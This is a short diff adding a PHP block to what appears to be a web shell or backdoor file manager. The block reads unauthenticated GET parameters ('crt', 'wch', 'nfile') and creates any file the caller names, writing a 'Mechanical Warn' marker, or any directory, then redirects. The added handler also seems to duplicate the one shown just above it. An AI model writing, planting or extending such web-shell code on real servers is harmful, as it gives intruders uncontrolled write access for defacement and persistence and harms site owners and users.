@@ -213,6 +213,26 @@ if (isset($_GET['crt'])) {
 		}
 }
 ?>
+
+<!--//Make File/Dir-->
+<?php
+if (isset($_GET['crt'])) {
+	$mtd = $_GET['wch'];
+		if($mtd === "file"){
+			$file = fopen($_GET['nfile'], "w") or die("Unable to open file!");
+			$isi = "Mechanical Warn\n";
+			fwrite($file, $isi);
+			fclose($file);
+			header('location:?file_manager');
+		}
+		elseif($mtd === "dir"){
+			$nmd = $_GET['nfile'];
+    		mkdir($nmd);
+    		header('location:?file_manager');
+		}
+}
+?>	    
+	    
 <!--//File Manager-->
 <?php
     if (isset($_GET['file_manager'])) {
